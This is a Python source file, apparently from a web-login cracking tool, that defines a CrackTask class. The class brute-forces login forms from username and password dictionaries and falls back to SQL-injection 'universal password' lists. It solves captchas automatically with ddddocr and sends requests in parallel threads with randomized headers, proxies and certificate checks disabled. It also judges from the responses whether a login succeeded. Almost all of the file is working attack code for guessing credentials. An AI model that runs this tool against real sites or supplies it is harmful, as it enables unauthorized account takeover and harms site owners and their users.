import requests
from http_requests import TaskStopped, request_with_timeout_retries
import threading
from copy import copy, deepcopy
from contextlib import contextmanager
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
from enum import Enum
from parse.recognizers import json_path
from parse.v2board import response_state as v2board_response_state
import captcha_solver


class CaptchaSolveError(RuntimeError):
    """验证码识别未成功；当前网站放弃继续尝试。"""


class LoginState(Enum):
    SUCCESS = "success"
    FAILURE = "failure"
    UNKNOWN = "unknown"
    STOPPED = "stopped"
    ERROR = "error"


from generator.dict import *
from generator.header import get_random_headers
from conf.config import *
import logs.log as Log
from parse.parser import Parser, Parser as _ParserType
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import time


def get_res_length(res):
    # return len(res.text + str(res.headers))
    return len(res.text)


class CrackTask:
    id = 0
    url = ''
    parser = {}
    error_length = 0
    requests_proxies = {}
    timeout = 0
    fail_words = []
    test_username = ''
    test_password = ''
    conn = {}

    def __init__(self):
        # 加载配置文件
        self.requests_proxies = crackConfig["requests_proxies"]
        self.timeout = crackConfig["timeout"]
        self.fail_words = crackConfig["fail_words"]
        self.test_username = crackConfig["test_username"]
        self.test_password = crackConfig["test_password"]
        self.baseline_responses = []
        self.stopped = False
        self.conn = None
        self._json_sessions = None
        self._json_sessions_lock = threading.Lock()
        self.concurrency = crackConfig.get("concurrency", 5)
        self._server_error_streak = 0
        if isinstance(self.concurrency, bool) or not isinstance(self.concurrency, int) or self.concurrency <= 0:
            raise ValueError("concurrency 必须是正整数")

    def run(self, id, url):
        self.id = id
        self.url = url
        print("")
        Log.init_log_id(id)
        Log.Info(f"[*] Start: {url}")
        try:
            self.conn = requests.session()
            self.parser = Parser(self.url, session=self.conn)
            if not self.parser.run():
                return
            self.error_length = self.get_error_length()
            self._report_success_rule()
            username_dict, password_dict = gen_dict(url)
            username, password = self.crack_task(username_dict, password_dict)
            # 万能密码爆破
            if not username and not password and not self.stopped:
                if self.parser.cms:
                    sqlin_dict_enable = self.parser.cms["sqlin_able"]
                else:
                    sqlin_dict_enable = generatorConfig["dict_config"]["sqlin_dict"]["enable"]
                if sqlin_dict_enable:
                    Log.Info(f"[*] {url} 启动万能密码爆破模块")
                    sqlin_user_dict, sqlin_pass_dict = gen_sqlin_dict()
                    username, password = self.crack_task(sqlin_user_dict, sqlin_pass_dict)

            if username and password:
                Log.Success(f"[+] Success: {url}  {username}/{password}")
                return {"url": url, "username": username, "password": password}
            Log.Error("[-] Failed: " + url)
        except TaskStopped:
            Log.Info(f"[*] 任务已停止，跳过剩余请求: {url}")
        except CaptchaSolveError as e:
            Log.Error(f"[-] 跳过（验证码）: {url}: {e}")
        except Exception as e:
            Log.Error(f"{str(e)}")
        finally:
            if self.conn is not None:
                self.conn.close()

    def crack_request(self, conn, username, password):
        data = self.parser.data.copy()
        path = self.parser.post_path
        data[self.parser.username_keyword] = username
        data[self.parser.password_keyword] = password
        headers = get_random_headers()
        headers.update(getattr(self.parser,"request_headers",{}))
        captcha_required = bool(getattr(self.parser, "captcha_required", False))
        # 验证码为一次性凭据，每次提交都重新获取并识别；若响应明确提示
        # 验证码错误，则换一张重新识别后重发，避免把验证码失败当成密码失败。
        # 5xx 多为瞬时服务端错误，同样有界重试，避免单次抖动终止整个站点。
        captcha_left = captchaConfig.get("request_retries", 3) if captcha_required else 1
        if not isinstance(captcha_left, int) or isinstance(captcha_left, bool) or captcha_left < 1:
            captcha_left = 1
        server_left = crackConfig.get("server_error_retries", 2)
        if not isinstance(server_left, int) or isinstance(server_left, bool) or server_left < 0:
            server_left = 0
        res = None
        while True:
            if captcha_required:
                data[self.parser.captcha_field] = self.solve_captcha(conn)
            payload = {"data": data}
            if getattr(self.parser, "request_format", "form") == "json":
                headers["Content-Type"] = "application/json"
                payload = {"json": data}
            res = request_with_timeout_retries(
                lambda: conn.post(url=path, **payload, headers=headers, timeout=self.timeout, verify=False,
                                  allow_redirects=True, proxies=self.requests_proxies),
                context=f"登录 POST {path}", stop_event=getattr(self, "_stop_event", None))
            res.encoding = res.apparent_encoding
            known_v2board = (getattr(self.parser, "site_adapter", "") == "v2board"
                             and v2board_response_state(res) is not None)
            if server_left > 0 and 500 <= res.status_code < 600 and not known_v2board:
                server_left -= 1
                Log.Info(f"[*] {self.url} 登录响应 HTTP {res.status_code}，重新获取验证码后重试")
                time.sleep(crackConfig["delay"])
                continue
            if captcha_required and captcha_left > 1 and self._captcha_rejected(res):
                captcha_left -= 1
                Log.Info(f"[*] {self.url} 验证码校验未通过，重新识别后重试")
                time.sleep(crackConfig["delay"])
                continue
            break
        time.sleep(crackConfig["delay"])
        res.encoding = res.apparent_encoding
        return res

    @staticmethod
    def _is_server_error(res):
        """5xx 多为单条凭据触发的服务端异常或瞬时故障，不等同于站点级失败。"""
        code = getattr(res, "status_code", 0)
        return isinstance(code, int) and 500 <= code < 600

    def _server_error_limit(self):
        limit = crackConfig.get("server_error_limit", 3)
        if isinstance(limit, bool) or not isinstance(limit, int) or limit < 1:
            return 1
        return limit

    def _register_server_error(self, status):
        """记录一次“仅得到 5xx”的候选；返回是否应放弃该站点。"""
        self._server_error_streak += 1
        limit = self._server_error_limit()
        Log.Info(f"[*] {self.url} 候选仅返回 HTTP {status}，跳过并继续"
                 f"（连续 {self._server_error_streak}/{limit}）")
        return self._server_error_streak >= limit

    def _register_outcome(self):
        self._server_error_streak = 0

    def _captcha_rejected(self, res):
        words = captchaConfig.get("captcha_fail_words", [])
        if not words:
            return False
        body = (res.text or "").casefold()
        return any(word and word.casefold() in body for word in words)

    def _valid_captcha_text(self, text):
        if not isinstance(text, str):
            return False
        text = text.strip()
        if not text:
            return False
        # 页面声明了长度时按声明校验：长度不符的值会被服务端判为非法参数，
        # 必须换图重识别，避免提交长度不符的值。
        declared = getattr(self.parser, "captcha_length", None)
        if isinstance(declared, int) and not isinstance(declared, bool) and declared > 0:
            return len(text) == declared
        minimum = captchaConfig.get("min_length", 1)
        maximum = captchaConfig.get("max_length", 12)
        return len(text) >= minimum and len(text) <= maximum

    def fetch_captcha_image(self, conn):
        """获取验证码图片字节；支持内联 data: URI 与站内相对地址。"""
        url = getattr(self.parser, "captcha_image_url", "")
        if not url:
            return None
        inline = captcha_solver.decode_data_uri(url)
        if inline:
            return inline
        try:
            res = request_with_timeout_retries(
                lambda: conn.get(url, headers=get_random_headers(), timeout=self.timeout,
                                 verify=False, proxies=self.requests_proxies),
                context=f"验证码 GET {url}", stop_event=getattr(self, "_stop_event", None))
        except TaskStopped:
            raise
        except requests.RequestException as exc:
            Log.Info(f"[-] {self.url} 验证码请求异常: {exc}")
            return None
        if res.status_code != 200 or not res.content:
            Log.Info(f"[-] {self.url} 验证码响应异常: HTTP {res.status_code}")
            return None
        return res.content

    def solve_captcha(self, conn):
        """重新获取验证码并调用 ddddocr 识别；多次失败后放弃当前网站。"""
        field = getattr(self.parser, "captcha_field", "")
        if not field:
            raise CaptchaSolveError(f"{self.url} 缺少验证码字段映射")
        retries = captchaConfig.get("solve_retries", 3)
        if not isinstance(retries, int) or isinstance(retries, bool) or retries < 1:
            retries = 3
        for _ in range(retries):
            image = self.fetch_captcha_image(conn)
            text = captcha_solver.recognize(image) if image else None
            if self._valid_captcha_text(text):
                Log.Info(f"[*] {self.url} ddddocr 识别验证码: {text}")
                return text.strip()
        raise CaptchaSolveError(f"{self.url} ddddocr 验证码识别失败")

    def _success_rule_sources(self):
        """汇总当前生效的成功判定来源，便于定位“无明确规则即不确定”的情况。"""
        parser = self.parser
        sources = []
        if getattr(parser, "profile_success_fields", None):
            sources.append("profile_success_fields")
        if getattr(parser, "json_response_success", None):
            sources.append("script_rules")
        profile_tokens = getattr(parser, "json_token_fields", None)
        if profile_tokens:
            sources.append("profile_token_fields")
        if crackConfig.get("success_words"):
            sources.append("success_words")
        if crackConfig.get("json_success_fields"):
            sources.append("json_success_fields")
        if (profile_tokens is None and getattr(parser, "request_format", "form") == "json"
                and not getattr(parser, "json_response_success", None)
                and not getattr(parser, "profile_success_fields", None)
                and crackConfig.get("json_token_fields")):
            sources.append("default_token_fields")
        if getattr(parser, "cms", None) and parser.cms.get("success_flag"):
            sources.append("cms_success_flag")
        return sources

    def _report_success_rule(self):
        sources = self._success_rule_sources()
        if sources:
            Log.Info(f"[*] 成功判定来源: {','.join(sources)}")
        else:
            Log.Info("[*] 未获得明确成功规则：命中将记为不确定；可用 success_words、"
                     "json_success_fields 或 site_profiles 配置")

    def _success_evidence(self, res):
        evidence = set()
        using_profile = getattr(self.parser,"profile_success_fields",None) is not None
        words = [] if using_profile else list(crackConfig.get("success_words", []))
        if self.parser.cms and self.parser.cms.get("success_flag"):
            words.append(self.parser.cms["success_flag"])
        for word in words:
            if word and word in res.text:
                evidence.add(("body", word))
        profile_rules = getattr(self.parser,"profile_success_fields",None)
        rules = crackConfig.get("json_success_fields", {}) if profile_rules is None else profile_rules
        if "json" in res.headers.get("Content-Type", "").lower():
            try:
                body = res.json()
                if isinstance(body, dict) and rules and all(
                    type(json_path(body,key)) is type(value) and json_path(body,key) == value
                    for key, value in rules.items()
                ):
                    required = getattr(self.parser,"json_required_nonempty_fields",[])
                    if all(isinstance(json_path(body,key),str) and json_path(body,key).strip() for key in required):
                        evidence.add(("json", "configured_fields"))
                inferred = getattr(self.parser, "json_response_success", {})
                required = getattr(self.parser, "json_required_nonempty_fields", [])
                if isinstance(body, dict) and inferred and all(
                    isinstance(json_path(body,key), str) and bool(json_path(body,key).strip()) for key in required
                ) and all(
                    any(type(json_path(body,key)) is type(value) and json_path(body,key) == value for value in values)
                    for key, values in inferred.items()
                ):
                    evidence.add(("json", "script_success_rule"))
                if isinstance(body, dict) and (getattr(self.parser, "request_format", "form") == "json"
                                              or getattr(self.parser,"json_token_fields",None) is not None):
                    profile_tokens = getattr(self.parser,"json_token_fields",None)
                    tokens = crackConfig.get("json_token_fields", []) if profile_tokens is None else profile_tokens
                    for field in tokens:
                        token = json_path(body,field)
                        required = getattr(self.parser,"json_required_nonempty_fields",[])
                        if (isinstance(token, str) and token.strip() and ((profile_rules is None and not inferred) or (profile_rules is not None and not profile_rules))
                                and all(isinstance(json_path(body,key),str) and json_path(body,key).strip() for key in required)):
                            evidence.add(("token", field))
            except (ValueError, TypeError):
                pass
        return evidence

    def classify_response(self, res, baselines=None):
        """初判与复核共用；长度、重定向和 Cookie 变化不单独证明成功。"""
        text = res.text.casefold()
        stop_words = list(crackConfig.get("stop_words", []))
        if self.parser.cms and self.parser.cms.get("die_flag"):
            stop_words.append(self.parser.cms["die_flag"])
        if res.status_code == 429 or any(word and word.casefold() in text for word in stop_words):
            return LoginState.STOPPED
        if getattr(self.parser, "site_adapter", "") == "v2board":
            state = v2board_response_state(res)
            if state is not None:
                return LoginState(state)
        if res.status_code == 401:
            return LoginState.FAILURE
        if not 200 <= res.status_code < 300:
            return LoginState.ERROR
        if any(word and word.casefold() in text for word in self.fail_words):
            return LoginState.FAILURE
        # 正文中的真实登录表单仍存在时，不因长度或成功字样而报成功。
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(res.text, "lxml")
        for form in soup.find_all("form"):
            fields = form.find_all("input")
            names = {field.get("name", "") for field in fields}
            if any(field.get("type", "").lower() == "password" for field in fields) or (
                    self.parser.username_keyword in names and self.parser.password_keyword in names):
                return LoginState.FAILURE
        evidence = self._success_evidence(res)
        reference = self.baseline_responses if baselines is None else baselines
        for baseline in reference:
            evidence.difference_update(self._success_evidence(baseline))
        return LoginState.SUCCESS if evidence else LoginState.UNKNOWN

    def get_error_length(self):
        # 保留方法名供调用方兼容；长度仅作诊断，不参与成功判定。
        if self.conn is None:
            self.conn = requests.session()
        self.baseline_responses = [
            self.crack_request(self.conn, self.test_username, self.test_password)
            for _ in range(2)
        ]
        for res in self.baseline_responses:
            state = self.classify_response(res, baselines=[])
            if state in (LoginState.STOPPED, LoginState.ERROR, LoginState.SUCCESS):
                self.stopped = True
                raise ValueError("失败基线异常或包含成功证据，停止当前任务")
        return get_res_length(self.baseline_responses[0])

    def _fresh_response(self, username, password):
        # 每次复核使用独立会话，并重新获取页面 Cookie 和隐藏字段。
        previous = self.parser
        try:
            with requests.session() as conn:
                parser = Parser(self.url, session=conn)
                parser.stop_event = getattr(self, "_stop_event", None)
                refreshed = parser.refresh_from(previous) if isinstance(previous, _ParserType) else parser.run()
                if not refreshed:
                    return None
                self.parser = parser
                return self.crack_request(conn, username, password)
        finally:
            self.parser = previous

    def recheck(self, username, password):
        password = password.replace('{user}', username)
        baseline = self._fresh_response(self.test_username, self.test_password)
        if baseline is None:
            return False
        baseline_state = self.classify_response(baseline, baselines=[])
        if baseline_state in (LoginState.ERROR, LoginState.STOPPED, LoginState.SUCCESS):
            self.stopped = True
            return False
        candidate = self._fresh_response(username, password)
        if candidate is None:
            return False
        state = self.classify_response(candidate, baselines=[baseline])
        if state in (LoginState.STOPPED, LoginState.ERROR):
            self.stopped = True
        return state == LoginState.SUCCESS

    def crack_task(self, username_dict, password_dict):
        if self.stopped:
            return False, False
        if self.concurrency == 1:
            return self._serial_crack_task(username_dict, password_dict)
        return self._concurrent_crack_task(username_dict, password_dict)

    def _copy_request_plan(self, conn):
        # 复用只读识别结果，独立复制请求数据和成功规则，避免复核/填参串线。
        parser = copy(self.parser)
        parser.session = conn
        for field in ("data", "request_headers", "cms", "json_token_fields",
                      "profile_success_fields", "json_response_success",
                      "json_required_nonempty_fields", "captcha_required",
                      "captcha_field", "captcha_image_url", "captcha_length"):
            if hasattr(parser, field):
                setattr(parser, field, deepcopy(getattr(parser, field)))
        return parser

    @contextmanager
    def _request_context(self, stop=None):
        if getattr(self.parser, "request_format", "form") != "json":
            # 表单可能包含一次性 CSRF 字段，仍逐次刷新；静态脚本使用任务缓存。
            with requests.session() as conn:
                parser = Parser(self.url, session=conn)
                parser.stop_event = stop
                refreshed = parser.refresh_from(self.parser) if isinstance(self.parser, _ParserType) else parser.run()
                if not refreshed:
                    raise ValueError("登录表单刷新失败")
                yield conn, parser
            return

        # JSON 接口映射是已识别的静态结构，不逐候选下载/识别 JS。
        thread_id = threading.get_ident()
        owned = self._json_sessions is None
        conn = None
        cached = None
        if not owned:
            with self._json_sessions_lock:
                cached = self._json_sessions.get(thread_id)
                if cached is not None:
                    conn, bootstrap = cached
        if conn is None:
            conn = requests.session()
            try:
                bootstrap = self._copy_request_plan(conn)
                bootstrap.stop_event = stop
                if getattr(bootstrap, "diagnostic_code", "") != "PROFILE_APPLIED":
                    # 每个工作线程只初始化一次页面 Cookie，不再解析页面/脚本。
                    if not bootstrap.refresh_from(self.parser):
                        raise ValueError("登录页面状态刷新失败")
            except BaseException:
                conn.close()
                raise
            if not owned:
                with self._json_sessions_lock:
                    self._json_sessions[thread_id] = (conn, bootstrap)
        if cached is not None and bootstrap.request_format != "json":
            refreshed = Parser(self.url, session=conn)
            refreshed.stop_event = stop
            if not refreshed.refresh_from(bootstrap):
                raise ValueError("已变化的登录表单刷新失败")
            bootstrap = refreshed
            with self._json_sessions_lock:
                self._json_sessions[thread_id] = (conn, bootstrap)
        try:
            # 不修改协调线程的 parser；每次独立复制线程内已刷新的规则。
            parser = copy(bootstrap)
            for field in ("data", "request_headers", "cms", "json_token_fields",
                          "profile_success_fields", "json_response_success", "json_required_nonempty_fields",
                          "captcha_required", "captcha_field", "captcha_image_url", "captcha_length"):
                setattr(parser, field, deepcopy(getattr(bootstrap, field)))
            yield conn, parser
        finally:
            if owned:
                conn.close()

    def _attempt(self, username, password, stop):
        """JSON 复用线程内连接与静态请求计划；动态表单逐次刷新。"""
        Log.init_log_id(self.id)
        worker = CrackTask()
        worker.id, worker.url = self.id, self.url
        worker.baseline_responses = list(self.baseline_responses)
        worker._stop_event = stop
        try:
            if stop.is_set():
                return None
            with self._request_context(stop) as (conn, parser):
                worker.conn = conn
                worker.parser = parser
                if stop.is_set():
                    return None
                res = worker.crack_request(conn, username, password)
                state = worker.classify_response(res)
                if state == LoginState.ERROR and self._is_server_error(res):
                    # 单条凭据触发的服务端异常：标记后由协调线程跳过，不停止站点。
                    worker.server_error = True
                    worker.server_error_status = res.status_code
                elif state in (LoginState.STOPPED, LoginState.ERROR):
                    stop.set()
                    Log.Info(f"[*] 停止当前任务: {state.value} HTTP {res.status_code}")
                return state, username, password, worker
        except TaskStopped:
            # 任务已被其他候选停止；本次请求取消，不作为站点异常或新触发条件。
            return None
        except CaptchaSolveError:
            stop.set()
            raise
        except Exception as exc:
            stop.set()
            Log.Error(f"[-] 登录请求异常: {self.url}: {exc}")
            return LoginState.ERROR, username, password, worker
        finally:
            worker.conn = None
            Log.init_log_id(None)

    def _concurrent_crack_task(self, username_dict, password_dict):
        total = len(username_dict) * len(password_dict)
        if not total:
            return False, False
        candidates = iter((username, password.replace('{user}', username))
                          for username in username_dict for password in password_dict)
        stop = threading.Event()
        pending = set()
        submitted = 0
        self._json_sessions = {}
        executor = ThreadPoolExecutor(max_workers=min(self.concurrency, total),
                                      thread_name_prefix="login-request")

        def submit_next():
            nonlocal submitted
            if stop.is_set():
                return
            candidate = next(candidates, None)
            if candidate is not None:
                username, password = candidate
                submitted += 1
                Log.Info(f"[*] {self.url} 进度: ({submitted}/{total}) checking: {username} {password}")
                pending.add(executor.submit(self._attempt, username, password, stop))

        try:
            for _ in range(min(self.concurrency, total)):
                submit_next()
            while pending:
                done, _ = wait(pending, return_when=FIRST_COMPLETED)
                pending.difference_update(done)
                outcomes = [future.result() for future in done]
                # 同一完成批次中限流/异常优先；仅凭据级 5xx 不停止站点。
                if any(outcome and outcome[0] in (LoginState.STOPPED, LoginState.ERROR)
                       and not getattr(outcome[3], "server_error", False)
                       for outcome in outcomes):
                    self.stopped = True
                    return False, False
                for outcome in outcomes:
                    if outcome is None:
                        continue
                    state, username, password, worker = outcome
                    if state == LoginState.ERROR and getattr(worker, "server_error", False):
                        status = getattr(worker, "server_error_status", 500)
                        if self._register_server_error(status):
                            self.stopped = True
                            Log.Info("[*] 连续服务端错误，停止当前任务")
                            return False, False
                        continue
                    self._register_outcome()
                    if state == LoginState.SUCCESS:
                        if stop.is_set():
                            self.stopped = True
                            return False, False
                        # 复核只在协调线程执行；worker 的 parser 与其他尝试隔离。
                        verified = worker.recheck(username, password)
                        if worker.stopped or stop.is_set():
                            self.stopped = True
                            return False, False
                        if verified:
                            return username, password
                    elif state == LoginState.UNKNOWN:
                        Log.Info("[*] 登录状态不确定：缺少明确成功证据")
                for _ in done:
                    submit_next()
            return False, False
        finally:
            stop.set()
            for future in pending:
                future.cancel()
            # 已发送请求仍需收尾；等待其关闭会话，停止提交新请求。
            executor.shutdown(wait=True, cancel_futures=True)
            for conn, parser in self._json_sessions.values():
                conn.close()
            self._json_sessions = None

    def _serial_crack_task(self, username_dict, password_dict):
        num = 0
        dic_all = len(username_dict) * len(password_dict)
        for username in username_dict:
            for password in password_dict:
                password = password.replace('{user}', username)
                num += 1
                Log.Info(f"[*] {self.url} 进度: ({num}/{dic_all}) checking: {username} {password}")
                res = self.crack_request(self.conn, username, password)
                state = self.classify_response(res)
                if state in (LoginState.STOPPED, LoginState.ERROR):
                    if state == LoginState.ERROR and self._is_server_error(res):
                        if self._register_server_error(res.status_code):
                            self.stopped = True
                            Log.Info("[*] 连续服务端错误，停止当前任务")
                            return False, False
                        continue
                    self.stopped = True
                    Log.Info(f"[*] 停止当前任务: {state.value} HTTP {res.status_code}")
                    return False, False
                self._register_outcome()
                if state == LoginState.SUCCESS:
                    # 复核失败后继续处理，而不是丢弃尚未检查的条目。
                    if self.recheck(username, password):
                        return username, password
                    if self.stopped:
                        return False, False
                elif state == LoginState.UNKNOWN:
                    Log.Info("[*] 登录状态不确定：缺少明确成功证据")
        return False, False
